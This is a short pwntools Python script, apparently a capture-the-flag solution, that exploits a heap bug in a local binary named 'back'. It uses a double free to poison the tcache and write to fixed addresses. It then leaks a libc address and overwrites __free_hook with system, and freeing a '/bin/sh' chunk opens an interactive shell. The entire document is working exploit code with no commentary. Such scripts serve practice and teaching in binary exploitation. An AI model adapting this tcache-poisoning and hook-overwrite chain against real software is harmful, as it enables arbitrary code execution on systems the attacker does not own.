from pwn import *

io=process("./back",env={"LD_PRELOAD":"./libc.so.6"})

io.sendlineafter("Name:","a"*8+p64(0x111))
def add(size,data):
    io.sendlineafter("Your choice :","1")
    io.sendlineafter("Size:",str(size))
    io.recvuntil("Data:")
    io.send(data)

def remove():
    io.sendlineafter("Your choice :","2")

add(70,"a"*10)
remove()
remove()
add(70,p64(0x602170))
add(70,p64(0x602170))
gdb.attach(io)
pay=p64(0)+p64(0x21)+"a"*16+p64(0)+p64(0x21)
add(70,pay)
add(250,"b"*10)
remove()
remove()
add(250,p64(0x602070))
add(250,p64(0x602070))
add(250,"b"*1)
remove()
io.sendlineafter("Your choice :","3")
io.recvuntil("aaaaaaaa")
io.recv(8)
libc_leak=u64(io.recv(6)+"\x00\x00")
libc_base=libc_leak-0x3ebca0
free_hook=libc_base+0x3ed8e8
log.info("libc_base = "+str(hex(libc_base)))
log.info("free_hook = "+str(hex(free_hook)))
system= libc_base+0x4f440
add(50,"a"*10)
remove()
remove()
add(50,p64(free_hook))
add(50,p64(free_hook))
add(50,p64(system))
add(100,"/bin/sh\x00")
io.interactive()
